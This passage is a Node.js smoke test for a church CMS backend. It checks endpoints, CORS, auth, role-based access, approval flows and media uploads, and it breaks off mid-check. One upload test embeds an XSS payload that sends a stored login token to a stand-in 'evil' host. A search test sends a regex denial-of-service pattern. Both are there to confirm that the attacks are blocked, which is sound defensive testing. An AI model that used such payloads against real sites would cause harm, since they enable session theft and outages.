/* eslint-disable no-console */
/**
 * End-to-end smoke test against a real (in-memory) MongoDB.
 *
 *   npm run build && node scripts/smoke-test.js     (from backend/)
 *
 * Boots the compiled app, runs the seed logic via the API where possible,
 * and exercises the public Website contract + admin auth flow.
 */
const assert = require("node:assert");
const { MongoMemoryServer } = require("mongodb-memory-server");

const PORT = 4123;
const BASE = `http://127.0.0.1:${PORT}/v1`;

/** A genuine 1×1 PNG, for asserting that real images still get through. */
function sharpPixel() {
  return require("sharp")({
    create: { width: 1, height: 1, channels: 3, background: "#a81b5e" },
  })
    .png()
    .toBuffer();
}

async function json(response) {
  const text = await response.text();
  try {
    return JSON.parse(text);
  } catch {
    return text;
  }
}

async function main() {
  const mongo = await MongoMemoryServer.create();
  process.env.MONGODB_URI = mongo.getUri("csistmc-portal");
  process.env.PORT = String(PORT);
  process.env.PUBLIC_URL = `http://127.0.0.1:${PORT}`;
  process.env.JWT_ACCESS_SECRET = "smoke-access";
  process.env.JWT_REFRESH_SECRET = "smoke-refresh";
  /*
   * Mirrors a deployment behind a reverse proxy - the container's own router is
   * one - so `req.ip` comes from `X-Forwarded-For`. That is what the rate
   * limiter buckets by, and the checks below rely on it to get a bucket of
   * their own instead of fighting over the shared one.
   */
  process.env.TRUST_PROXY = "true";
  process.env.SEED_ADMIN_EMAIL = "admin@example.org";
  process.env.SEED_ADMIN_PASSWORD = "Password@123";
  // The demo event and announcement are opt-in, so a real installation never
  // gets invented content on its public site. This throwaway in-memory database
  // is the case they exist for: the list-page checks below assert on them.
  process.env.SEED_DEMO_CONTENT = "true";

  // Seed first (uses the same AppModule context).
  require("../dist/seed/seed");
  // seed.ts runs async top-level; wait for it to finish by polling users count
  await new Promise((resolve) => setTimeout(resolve, 8000));

  const { NestFactory } = require("@nestjs/core");
  const { AppModule } = require("../dist/app.module");
  const { configureApp } = require("../dist/configure-app");

  // Same configuration as production, so the test cannot pass against an app
  // that differs from the one that ships.
  const app = await NestFactory.create(AppModule, { logger: ["error", "warn"] });
  configureApp(app);
  await app.listen(PORT, "0.0.0.0");

  let failures = 0;
  const check = async (name, fn) => {
    try {
      await fn();
      console.log(`  ✓ ${name}`);
    } catch (error) {
      failures += 1;
      console.error(`  ✗ ${name}: ${error.message}`);
    }
  };

  console.log("Public contract endpoints:");
  await check("GET /events returns published array", async () => {
    const res = await fetch(`${BASE}/events`);
    assert.equal(res.status, 200);
    const body = await json(res);
    assert(Array.isArray(body), "expected a plain array");
    assert(body.length >= 1, "expected seeded event");
    assert(body[0].title.en, "expected localized title");
    assert(body[0].slug, "expected slug");
    assert(body[0].id, "expected id");
    assert.equal(body[0].status, undefined, "public shape must omit status");
  });

  await check("GET /events?page=1 returns Paginated envelope", async () => {
    const body = await json(await fetch(`${BASE}/events?page=1&pageSize=5`));
    assert(Array.isArray(body.items), "expected items[]");
    assert.equal(body.page, 1);
    assert.equal(typeof body.total, "number");
    assert.equal(typeof body.hasMore, "boolean");
  });

  await check("GET /events/slugs returns string[]", async () => {
    const body = await json(await fetch(`${BASE}/events/slugs`));
    assert(Array.isArray(body) && typeof body[0] === "string");
  });

  await check("GET /events/:slug returns event, 404 on missing", async () => {
    const slugs = await json(await fetch(`${BASE}/events/slugs`));
    const one = await fetch(`${BASE}/events/${slugs[0]}`);
    assert.equal(one.status, 200);
    const missing = await fetch(`${BASE}/events/does-not-exist`);
    assert.equal(missing.status, 404);
  });

  await check("GET /blog returns array", async () => {
    const body = await json(await fetch(`${BASE}/blog`));
    assert(Array.isArray(body));
  });

  /*
   * The two filters `WebsiteRT/src/services/blog.service.ts` depends on:
   * `getBlogPostsByEvent` renders "read more about this" on an event page, and
   * `getBlogPostsByFellowship` fills each fellowship's own news list.
   *
   * Worth asserting because the failure is silent and wrong rather than loud:
   * an ignored query parameter returns *every* published post with a 200, so
   * each event page would quietly list the whole blog and nothing would error.
   */
  await check("GET /blog?event= and ?fellowship= actually filter", async () => {
    const posts = await json(await fetch(`${BASE}/blog`));
    const tagged = posts.find((post) => post.eventSlug);
    if (tagged) {
      const scoped = await json(
        await fetch(`${BASE}/blog?event=${encodeURIComponent(tagged.eventSlug)}`),
      );
      assert(Array.isArray(scoped), "must stay a plain array when filtered");
      assert(scoped.length >= 1, "the event's own post should be returned");
      assert(
        scoped.every((post) => post.eventSlug === tagged.eventSlug),
        "?event= let through posts about other events",
      );
    }

    const filed = posts.find((post) => post.fellowshipSlug);
    if (filed) {
      const scoped = await json(
        await fetch(`${BASE}/blog?fellowship=${filed.fellowshipSlug}`),
      );
      assert(
        Array.isArray(scoped) &&
          scoped.every((post) => post.fellowshipSlug === filed.fellowshipSlug),
        "?fellowship= let through other fellowships' posts",
      );
    }

    // A slug nobody used must come back empty, not fall back to everything.
    const none = await json(await fetch(`${BASE}/blog?event=no-such-event-slug`));
    assert.deepEqual(none, [], "an unmatched ?event= returned posts anyway");
  });

  await check("GET /gallery + /gallery/slugs", async () => {
    assert(Array.isArray(await json(await fetch(`${BASE}/gallery`))));
    assert(Array.isArray(await json(await fetch(`${BASE}/gallery/slugs`))));
  });

  await check("GET /church/service-timings has no `language` field", async () => {
    const timings = await json(await fetch(`${BASE}/church/service-timings`));
    assert(Array.isArray(timings) && timings.length > 0, "expected seeded timings");
    for (const timing of timings) {
      assert.equal(
        timing.language,
        undefined,
        "`language` was dropped from ServiceTiming by the Website contract",
      );
      for (const key of ["day", "time", "service", "venue"]) {
        assert(timing[key]?.en !== undefined, `timing.${key} missing`);
      }
    }
  });

  await check("GET /announcements pinned-first", async () => {
    const body = await json(await fetch(`${BASE}/announcements`));
    assert(Array.isArray(body) && body.length >= 1);
    assert.equal(body[0].pinned, true, "seeded pinned announcement first");
  });

  await check("GET /announcements/pinned returns record or null", async () => {
    const res = await fetch(`${BASE}/announcements/pinned`);
    assert.equal(res.status, 200);
    const body = await json(res);
    assert(body === null || body.pinned === true);
  });

  await check("GET /downloads/grouped returns 3 buckets", async () => {
    const body = await json(await fetch(`${BASE}/downloads/grouped`));
    for (const key of ["bulletin", "form", "document"]) {
      assert(Array.isArray(body[key]), `missing bucket ${key}`);
    }
  });

  await check("GET /fellowships sorted by order, 8 seeded", async () => {
    const body = await json(await fetch(`${BASE}/fellowships`));
    assert.equal(body.length, 8);
    const orders = body.map((f) => f.order);
    assert.deepEqual(orders, [...orders].sort((a, b) => a - b));
  });

  await check("GET /fellowships/:slug", async () => {
    const res = await fetch(`${BASE}/fellowships/youth-fellowship`);
    assert.equal(res.status, 200);
    const body = await json(res);
    assert(body.banner.url && body.coordinator.name.en);
  });

  await check("GET /church/* - only the CMS-owned singletons", async () => {
    for (const key of ["service-timings", "pastor-message", "weekly-verse"]) {
      const res = await fetch(`${BASE}/church/${key}`);
      assert.equal(res.status, 200, `GET /church/${key} → ${res.status}`);
    }
    const timings = await json(await fetch(`${BASE}/church/service-timings`));
    assert(Array.isArray(timings) && timings[0].day.en, "timings shape");
    const message = await json(await fetch(`${BASE}/church/pastor-message`));
    assert(message.authorName?.en && Array.isArray(message.body), "pastor message shape");
  });

  await check("Write-once content is not served (hardcoded in Website)", async () => {
    // These are written into the Website itself; the Portal must not expose
    // endpoints for content nobody can edit here.
    for (const path of [
      "/church/profile",
      "/church/history",
      "/church/vision-mission",
      "/church/diocese",
      "/hero-slides",
      "/leadership",
    ]) {
      const res = await fetch(`${BASE}${path}`);
      assert.equal(res.status, 404, `${path} should be gone, got ${res.status}`);
    }
  });

  await check("POST /contact returns { success, messageKey }", async () => {
    const res = await fetch(`${BASE}/contact`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: "Smoke Test",
        email: "smoke@example.org",
        subject: "Hello",
        message: "This is a smoke-test message body.",
      }),
    });
    assert.equal(res.status, 200);
    const body = await json(res);
    assert.equal(body.success, true);
    assert.equal(body.messageKey, "success");
  });

  await check("CORS admits same-network origins, refuses the open internet", async () => {
    // A phone or laptop on the LAN must be able to call the API; a random
    // public site must not.
    for (const origin of [
      "http://192.168.1.20:3001",
      "http://10.147.18.1:3001",
      "http://172.20.4.9:3001",
      "http://macbook.local:3001",
      "http://localhost:3001",
    ]) {
      const res = await fetch(`${BASE}/events`, { headers: { Origin: origin } });
      assert.equal(
        res.headers.get("access-control-allow-origin"),
        origin,
        `${origin} should be allowed`,
      );
    }

    const outside = await fetch(`${BASE}/events`, {
      headers: { Origin: "http://evil.example.com" },
    });
    assert.equal(
      outside.headers.get("access-control-allow-origin"),
      null,
      "a public origin must not be reflected",
    );

    // No Origin header at all (curl, server-to-server) must still work.
    const direct = await fetch(`${BASE}/events`);
    assert.equal(direct.status, 200);
  });

  await check("F-068: production CORS keeps writes/auth/admin to listed origins", async () => {
    const { corsOptionsDelegate } = require("../dist/common/utils/cors");
    const delegate = corsOptionsDelegate({
      apiPrefix: "v1",
      allowed: ["*", "https://cms.example.org"],
      allowPrivateNetwork: false,
      publicReadAnyOrigin: false,
      production: true,
    });
    const optionsFor = (method, url, headers = {}) =>
      new Promise((resolve) => delegate({ method, url, headers }, (_e, o) => resolve(o)));
    const admits = (options, origin) =>
      typeof options.origin === "string"
        ? options.origin === "*"
        : new Promise((resolve) => options.origin(origin, (_e, ok) => resolve(ok)));

    // Public reads: an open, uncredentialed wildcard.
    const read = await optionsFor("GET", "/v1/events?page=1");
    assert.equal(read.origin, "*");
    assert.equal(read.credentials, false);

    // Writes, sign-in and admin reads: only the listed origin, even with "*".
    for (const [method, url, headers] of [
      ["POST", "/v1/auth/login"],
      ["GET", "/v1/admin/events"],
      ["PATCH", "/v1/admin/events/1"],
      ["POST", "/v1/contact"],
      ["OPTIONS", "/v1/admin/blog", { "access-control-request-method": "DELETE" }],
      ["OPTIONS", "/v1/events", { "access-control-request-method": "POST" }],
    ]) {
      const options = await optionsFor(method, url, headers);
      assert.equal(options.credentials, true, `${method} ${url} must be credentialed`);
      assert.equal(await admits(options, "https://evil.example.com"), false,
        `${method} ${url} admitted an unlisted origin`);
      assert.equal(await admits(options, "https://cms.example.org"), true,
        `${method} ${url} refused the listed origin`);
    }

    // A preflight for a public GET gets the open policy too.
    const preflight = await optionsFor("OPTIONS", "/v1/blog", {
      "access-control-request-method": "GET",
    });
    assert.equal(preflight.origin, "*");
  });

  await check("F-068: running app never answers a write with a wildcard", async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: "OPTIONS",
      headers: {
        Origin: "http://evil.example.com",
        "Access-Control-Request-Method": "POST",
      },
    });
    const allow = res.headers.get("access-control-allow-origin");
    assert.notEqual(allow, "*");
    assert.notEqual(allow, "http://evil.example.com");
  });

  console.log("Auth + admin flow:");
  let tokens;
  await check("POST /auth/login", async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: "admin@example.org", password: "Password@123" }),
    });
    assert.equal(res.status, 200);
    tokens = await json(res);
    assert(tokens.accessToken && tokens.refreshToken && tokens.user.role === "super-admin");
  });

  const auth = () => ({ Authorization: `Bearer ${tokens.accessToken}`, "Content-Type": "application/json" });

  await check("GET /admin/events requires auth", async () => {
    assert.equal((await fetch(`${BASE}/admin/events`)).status, 401);
    assert.equal((await fetch(`${BASE}/admin/events`, { headers: auth() })).status, 200);
  });

  let createdId;
  await check("POST /admin/events creates a draft (not public)", async () => {
    const res = await fetch(`${BASE}/admin/events`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        title: { en: "Smoke Event", ta: "சோதனை நிகழ்வு" },
        summary: { en: "Summary", ta: "சுருக்கம்" },
        description: [{ en: "Para", ta: "பத்தி" }],
        startDate: new Date(Date.now() + 86400000).toISOString(),
        location: { en: "Hall", ta: "மண்டபம்" },
      }),
    });
    assert.equal(res.status, 201);
    const body = await json(res);
    createdId = body.id;
    assert.equal(body.status, "draft");
    assert.equal(body.slug, "smoke-event");
    const publicSlugs = await json(await fetch(`${BASE}/events/slugs`));
    assert(!publicSlugs.includes("smoke-event"), "draft must not be public");
  });

  await check("PATCH /admin/events/:id/status publishes + audit written", async () => {
    const res = await fetch(`${BASE}/admin/events/${createdId}/status`, {
      method: "PATCH",
      headers: auth(),
      body: JSON.stringify({ status: "published" }),
    });
    assert.equal(res.status, 200);
    const publicSlugs = await json(await fetch(`${BASE}/events/slugs`));
    assert(publicSlugs.includes("smoke-event"), "published event must be public");
    const logs = await json(await fetch(`${BASE}/admin/audit-logs`, { headers: auth() }));
    assert(logs.items.some((l) => l.action === "publish"), "audit publish entry");
    assert(logs.items.some((l) => l.action === "login"), "audit login entry");
  });

  await check(
    "Gallery: shared album appears in every fellowship + video provider inferred",
    async () => {
      const image = {
        url: `${BASE.replace("/v1", "")}/uploads/images/x.jpg`,
        alt: { en: "Poster", ta: "போஸ்டர்" },
        width: 1600,
        height: 900,
      };

      // One album owned by the choir, one churchwide album owned by nobody.
      const owned = await json(
        await fetch(`${BASE}/admin/gallery`, {
          method: "POST",
          headers: auth(),
          body: JSON.stringify({
            title: { en: "Choir Outing", ta: "பாடகர் பயணம்" },
            date: "2026-05-01",
            cover: image,
            fellowshipSlug: "choir",
            status: "published",
          }),
        }),
      );
      const shared = await json(
        await fetch(`${BASE}/admin/gallery`, {
          method: "POST",
          headers: auth(),
          body: JSON.stringify({
            title: { en: "Christmas 2026", ta: "கிறிஸ்துமஸ் 2026" },
            date: "2026-12-25",
            cover: image,
            shared: true,
            status: "published",
          }),
        }),
      );
      assert.equal(shared.shared, true, "shared flag must round-trip");

      // The choir sees both; another fellowship sees only the shared one.
      const choir = await json(await fetch(`${BASE}/gallery?fellowship=choir`));
      const choirSlugs = choir.map((a) => a.slug);
      assert(choirSlugs.includes(owned.slug), "own album missing from its fellowship");
      assert(choirSlugs.includes(shared.slug), "shared album missing from fellowship");

      const youth = await json(await fetch(`${BASE}/gallery?fellowship=youth-fellowship`));
      const youthSlugs = youth.map((a) => a.slug);
      assert(youthSlugs.includes(shared.slug), "shared album must show for every fellowship");
      assert(!youthSlugs.includes(owned.slug), "another fellowship's album leaked");

      // A video item: provider is inferred server-side from the URL.
      await fetch(`${BASE}/admin/gallery/${shared.id}/photos`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({
          photos: [
            { image, video: { url: "https://youtu.be/dQw4w9WgXcQ" } },
            { image, video: { url: "https://vimeo.com/12345" } },
            { image, video: { url: "https://cdn.example.org/carols.mp4" } },
            { image },
          ],
        }),
      });
      const album = await json(await fetch(`${BASE}/gallery/${shared.slug}`));
      assert.equal(album.photos.length, 4, "one request should add the whole batch");
      assert.equal(album.photos[0].video.provider, "youtube");
      assert.equal(album.photos[1].video.provider, "vimeo");
      assert.equal(album.photos[2].video.provider, "file");
      assert.equal(album.photos[3].video, undefined, "a plain photo has no video");

      // Every stored link must be one the Website's player can parse.
      const YT_ID = /(?:youtu\.be\/|[?&]v=|\/embed\/|\/shorts\/)([\w-]{11})/;
      assert(YT_ID.test(album.photos[0].video.url), "YouTube url must expose an id");

      // A hosted link with no extractable id would render a dead player.
      const bad = await fetch(`${BASE}/admin/gallery/${shared.id}/photos`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({
          photos: [{ image, video: { url: "https://www.youtube.com/results?q=carols" } }],
        }),
      });
      assert.equal(bad.status, 400, `unplayable YouTube link should be rejected, got ${bad.status}`);

      const stillFour = await json(await fetch(`${BASE}/gallery/${shared.slug}`));
      assert.equal(stillFour.photos.length, 4, "a rejected batch must not be partially applied");
    },
  );

  /*
   * A new album can be created with its photos and videos in one request, so
   * the CMS no longer makes people create an empty album and come back.
   */
  await check("Gallery: album created with its photos in one step", async () => {
    const image = {
      url: `${BASE.replace("/v1", "")}/uploads/images/x.jpg`,
      alt: { en: "Poster", ta: "போஸ்டர்" },
      width: 1600,
      height: 900,
    };
    const created = await fetch(`${BASE}/admin/gallery`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        title: { en: "Harvest 2026", ta: "அறுவடை 2026" },
        date: "2026-09-01",
        cover: image,
        status: "published",
        photos: [{ image }, { image, video: { url: "https://youtu.be/dQw4w9WgXcQ" } }, { image }],
      }),
    });
    assert.equal(created.status, 201, `create with photos → ${created.status}`);
    const album = await json(created);
    assert.equal(album.photos.length, 3, "photos sent with the album must be stored");
    assert(album.photos.every((photo) => photo.id), "each item needs an id");
    assert.equal(album.photos[1].video.provider, "youtube", "order kept, provider inferred");

    const publicAlbum = await json(await fetch(`${BASE}/gallery/${album.slug}`));
    assert.equal(publicAlbum.photos.length, 3, "public album shows the photos");

    // An unplayable link refuses the whole create - no half-made album.
    const before = (await json(await fetch(`${BASE}/admin/gallery?pageSize=100`, { headers: auth() }))).total;
    const bad = await fetch(`${BASE}/admin/gallery`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        title: { en: "Bad Video", ta: "தவறு" },
        date: "2026-09-02",
        cover: image,
        photos: [{ image, video: { url: "https://www.youtube.com/results?q=x" } }],
      }),
    });
    assert.equal(bad.status, 400, `bad video on create → ${bad.status}`);
    const after = (await json(await fetch(`${BASE}/admin/gallery?pageSize=100`, { headers: auth() }))).total;
    assert.equal(after, before, "a refused create must not leave an album behind");

    // Tamil can be filled in later: an English-only album saves as a draft.
    const englishOnly = await fetch(`${BASE}/admin/gallery`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        title: { en: "English Only", ta: "" },
        date: "2026-09-03",
        cover: image,
        photos: [{ image }],
      }),
    });
    assert.equal(englishOnly.status, 201, `English-only album → ${englishOnly.status}`);

    // An image nobody has described yet is still usable (the CMS warns).
    const noAlt = { ...image, alt: { en: "", ta: "" } };
    const undescribed = await fetch(`${BASE}/admin/gallery`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        title: { en: "No Alt Yet", ta: "" },
        date: "2026-09-04",
        cover: noAlt,
        photos: [{ image: noAlt }],
      }),
    });
    assert.equal(undescribed.status, 201, `album with undescribed images → ${undescribed.status}`);

    // An editor's photo changes to a live album travel in their submission;
    // the approver's save applies them, keeping existing items' ids.
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ name: "Album Editor", email: "albumed@example.org", password: "Password@123", role: "editor" }),
    });
    const albumEd = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Forwarded-For": "203.0.113.90" },
        body: JSON.stringify({ email: "albumed@example.org", password: "Password@123" }),
      }),
    );
    const edHeaders = { Authorization: `Bearer ${albumEd.accessToken}`, "Content-Type": "application/json" };
    const reordered = [album.photos[2], album.photos[0], { image }];
    const held = await json(
      await fetch(`${BASE}/admin/gallery/${album.id}`, {
        method: "PATCH",
        headers: edHeaders,
        body: JSON.stringify({ photos: reordered }),
      }),
    );
    assert.equal(held.photos.length, 3, "live album untouched while the change waits");
    assert.equal(held.revision.changes.photos.length, 3, "photos held in the submission");
    const applied = await json(
      await fetch(`${BASE}/admin/gallery/${album.id}`, {
        method: "PATCH",
        headers: auth(),
        body: JSON.stringify({ photos: reordered, status: "published" }),
      }),
    );
    assert.deepEqual(
      applied.photos.slice(0, 2).map((p) => p.id),
      [album.photos[2].id, album.photos[0].id],
      "approval applies the photo order and keeps ids",
    );
    assert(applied.photos[2].id, "a new item gets an id");
    assert.equal(applied.revision, undefined);
    album.photos = applied.photos;

    // Outside that approval flow an update cannot replace the photo stream:
    // `photos` sent by an approver with no waiting change is ignored.
    await fetch(`${BASE}/admin/gallery/${album.id}`, {
      method: "PATCH",
      headers: auth(),
      body: JSON.stringify({ photos: [] }),
    });
    const unchanged = await json(await fetch(`${BASE}/gallery/${album.slug}`));
    assert.equal(unchanged.photos.length, 3, "photos untouched by an ordinary update");
  });

  await check(
    "POST /admin/media/video-poster fetches a YouTube thumbnail (needs network)",
    async () => {
      const res = await fetch(`${BASE}/admin/media/video-poster`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({ url: "https://youtu.be/jNQXAC9IVRw" }),
      });

      if (res.status === 422) {
        console.log("      (skipped - no outbound network for thumbnails)");
        return;
      }
      assert.equal(res.status, 201, `expected 201, got ${res.status}`);
      const poster = await json(res);
      assert(poster.url && poster.kind === "image", "poster should be a stored image");
      assert(poster.width > 0 && poster.height > 0, "poster needs dimensions");
      assert(poster.thumbnailUrl, "poster should get a thumbnail like any upload");
    },
  );

  await check("Media library accepts a video file upload", async () => {
    // Smallest thing that is unmistakably an mp4: an ftyp box header.
    const mp4 = Buffer.concat([
      Buffer.from([0, 0, 0, 0x20]),
      Buffer.from("ftypisom"),
      Buffer.alloc(4096),
    ]);
    const form = new FormData();
    form.append("file", new Blob([mp4], { type: "video/mp4" }), "carols.mp4");

    const res = await fetch(`${BASE}/admin/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 201, `video upload → ${res.status}`);
    const item = await json(res);
    assert.equal(item.kind, "video", `expected kind "video", got "${item.kind}"`);
    assert.equal(item.format, "MP4");
    assert(item.url.includes("/videos/"), "videos should be stored separately");
    assert(item.size, "human-readable size computed");

    // And it must be reachable, since the album stores this URL as video.url.
    const fetched = await fetch(item.url);
    assert.equal(fetched.status, 200, `uploaded video not served: ${fetched.status}`);

    // Stored under a readable name (for search engines) - no id in it.
    assert(/\/videos\/carols(?:-\d+)?\.mp4$/.test(item.url), `readable file name: ${item.url}`);

    // A camera name says nothing, so the hint (an album title) names it.
    const hinted = new FormData();
    hinted.append("file", new Blob([mp4], { type: "video/mp4" }), "VID_20261224_1830.mp4");
    hinted.append("nameHint", "Christmas Eve Service 2026");
    const named = await json(
      await fetch(`${BASE}/admin/media`, {
        method: "POST",
        headers: { Authorization: `Bearer ${tokens.accessToken}` },
        body: hinted,
      }),
    );
    assert(
      /\/videos\/christmas-eve-service-2026(?:-\d+)?\.mp4$/.test(named.url),
      `named from the hint: ${named.url}`,
    );
  });

  await check("Upload cannot smuggle HTML in under an image content-type", async () => {
    /*
     * The stored extension used to come from the client's filename while only
     * the client's content-type was checked, so these two could disagree and
     * the filename won: `payload.html` declared `image/png` landed in
     * `uploads/images/` and was served back as `text/html`. Behind the
     * container's router that is the CMS's own origin, and tokens live in
     * localStorage.
     */
    const form = new FormData();
    const html = "<script>fetch('//evil/'+localStorage.token)</script>";
    form.append(
      "file",
      new Blob([Buffer.from(html)], { type: "image/png" }),
      "payload.html",
    );
    const res = await fetch(`${BASE}/admin/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 400, `expected 400, got ${res.status}`);

    // And a real image must still land under an extension matching its type,
    // never under the one the caller asked for.
    const pngForm = new FormData();
    const png = await sharpPixel();
    pngForm.append("file", new Blob([png], { type: "image/png" }), "innocent.html");
    const ok = await fetch(`${BASE}/admin/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: pngForm,
    });
    assert.equal(ok.status, 201, `expected 201, got ${ok.status}`);
    const item = await json(ok);
    assert(item.url.endsWith(".png"), `stored as ${item.url}, expected .png`);
    assert(!item.url.includes(".html"), "the caller's extension reached disk");
  });

  await check("Search terms are matched literally, not as patterns", async () => {
    /*
     * `{ $regex: term }` compiles whatever arrives. Unescaped, `(` is a driver
     * syntax error (a 500 from typing a bracket) and `(a+)+$` is a denial of
     * service any `content.read` holder - including a viewer - could trigger.
     */
    for (const term of ["(", "(a+)+$", "*", "[", "\\"]) {
      const res = await fetch(
        `${BASE}/admin/blog?search=${encodeURIComponent(term)}`,
        { headers: auth() },
      );
      assert.equal(res.status, 200, `search ${JSON.stringify(term)} → ${res.status}`);
      const body = await json(res);
      assert(Array.isArray(body.items), "expected a paginated envelope");
    }
  });

  await check("Media library still refuses genuinely unsupported types", async () => {
    const form = new FormData();
    form.append("file", new Blob([Buffer.from("#!/bin/sh\n")], { type: "application/x-sh" }), "x.sh");
    const res = await fetch(`${BASE}/admin/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 400, `expected 400, got ${res.status}`);
  });

  await check("Video poster rejects a link with no video id", async () => {
    const res = await fetch(`${BASE}/admin/media/video-poster`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ url: "https://www.youtube.com/results?q=carols" }),
    });
    assert.equal(res.status, 422, `expected 422, got ${res.status}`);
  });

  await check("PUT /admin/church/weekly-verse updates singleton", async () => {
    const res = await fetch(`${BASE}/admin/church/weekly-verse`, {
      method: "PUT",
      headers: auth(),
      body: JSON.stringify({
        reference: { en: "John 3:16", ta: "யோவான் 3:16" },
        text: { en: "For God so loved the world…", ta: "தேவன் உலகத்தை அன்பு கூர்ந்தார்…" },
        weekOf: "2026-07-20",
      }),
    });
    assert.equal(res.status, 200);
    const verse = await json(await fetch(`${BASE}/church/weekly-verse`));
    assert.equal(verse.reference.en, "John 3:16");
  });

  await check("POST /auth/refresh rotates tokens", async () => {
    const res = await fetch(`${BASE}/auth/refresh`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ refreshToken: tokens.refreshToken }),
    });
    assert.equal(res.status, 200);
    const fresh = await json(res);
    assert(fresh.accessToken && fresh.refreshToken);
    const reuse = await fetch(`${BASE}/auth/refresh`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ refreshToken: tokens.refreshToken }),
    });
    assert.equal(reuse.status, 401, "old refresh token must be rejected after rotation");
    tokens = fresh;
  });

  await check("RBAC: viewer cannot write", async () => {
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        name: "View Only",
        email: "viewer@example.org",
        password: "Password@123",
        role: "viewer",
      }),
    });
    const login = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "viewer@example.org", password: "Password@123" }),
      }),
    );
    const res = await fetch(`${BASE}/admin/events`, {
      method: "POST",
      headers: { Authorization: `Bearer ${login.accessToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({}),
    });
    assert.equal(res.status, 403, `viewer create → ${res.status}`);
  });

  /*
   * Approval rule (church request, 22 Nov 2026): an editor's content goes live
   * only when an admin or super admin approves it; admins publish directly.
   */
  await check("Approval: editor submits, cannot publish; admin approves", async () => {
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        name: "Fellowship Editor",
        email: "editor@example.org",
        password: "Password@123",
        role: "editor",
      }),
    });
    const editorLogin = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "editor@example.org", password: "Password@123" }),
      }),
    );
    const asEditor = {
      Authorization: `Bearer ${editorLogin.accessToken}`,
      "Content-Type": "application/json",
    };
    const notice = (title, status) =>
      JSON.stringify({
        title: { en: title, ta: "அறிவிப்பு" },
        body: { en: "Choir practice moves to the parish hall.", ta: "…" },
        publishedAt: "2026-11-20",
        ...(status ? { status } : {}),
      });

    // 1. An editor cannot publish on create...
    const direct = await fetch(`${BASE}/admin/announcements`, {
      method: "POST",
      headers: asEditor,
      body: notice("Editor tries to publish", "published"),
    });
    assert.equal(direct.status, 403, `editor create published → ${direct.status}`);

    // 2. ...but can submit for approval, which is not public.
    const submitted = await json(
      await fetch(`${BASE}/admin/announcements`, {
        method: "POST",
        headers: asEditor,
        body: notice("Choir practice venue", "pending"),
      }),
    );
    assert.equal(submitted.status, "pending", "editor submission should be pending");
    const publicBefore = await json(await fetch(`${BASE}/announcements`));
    assert(
      !publicBefore.some((a) => a.id === submitted.id),
      "a pending announcement must not be public",
    );

    // 3. The editor cannot approve it (status endpoint) or publish via edit.
    const selfApprove = await fetch(`${BASE}/admin/announcements/${submitted.id}/status`, {
      method: "PATCH",
      headers: asEditor,
      body: JSON.stringify({ status: "published" }),
    });
    assert.equal(selfApprove.status, 403, `editor approve → ${selfApprove.status}`);
    const viaEdit = await fetch(`${BASE}/admin/announcements/${submitted.id}`, {
      method: "PATCH",
      headers: asEditor,
      body: JSON.stringify({ status: "published" }),
    });
    assert.equal(viaEdit.status, 403, `editor publish via edit → ${viaEdit.status}`);

    // 4. An admin approves it; now it is public.
    const approved = await fetch(`${BASE}/admin/announcements/${submitted.id}/status`, {
      method: "PATCH",
      headers: auth(),
      body: JSON.stringify({ status: "published" }),
    });
    assert.equal(approved.status, 200, `admin approve → ${approved.status}`);
    const publicAfter = await json(await fetch(`${BASE}/announcements`));
    assert(
      publicAfter.some((a) => a.id === submitted.id),
      "an approved announcement must be public",
    );

    // 5. Once live, the editor's edits are held for approval (church request,
    //    23 Nov 2026) - the website keeps the live version meanwhile.
    const liveTitle = publicAfter.find((a) => a.id === submitted.id).title.en;
    const editLive = await fetch(`${BASE}/admin/announcements/${submitted.id}`, {
      method: "PATCH",
      headers: asEditor,
      body: JSON.stringify({
        title: { en: "Changed after approval", ta: "மாற்றப்பட்டது" },
        status: "published",
      }),
    });
    assert.equal(editLive.status, 200, `editor edit published → ${editLive.status}`);
    const heldBody = await json(editLive);
    assert.equal(heldBody.status, "published", "the live record stays live");
    assert.equal(heldBody.title.en, liveTitle, "the live record is unchanged");
    assert.equal(heldBody.revision.changes.title.en, "Changed after approval", "the edit is held");
    assert.equal(heldBody.revision.changes.status, undefined, "an editor never sets a live status");
    const publicHeld = (await json(await fetch(`${BASE}/announcements`))).find((a) => a.id === submitted.id);
    assert.equal(publicHeld.title.en, liveTitle, "website keeps the live version");
    assert.equal(publicHeld.revision, undefined, "a waiting change never reaches the public API");

    const counts = await json(await fetch(`${BASE}/admin/dashboard/stats`, { headers: auth() }));
    assert.equal(counts.approvals.announcements.changes, 1, "dashboard counts the waiting change");

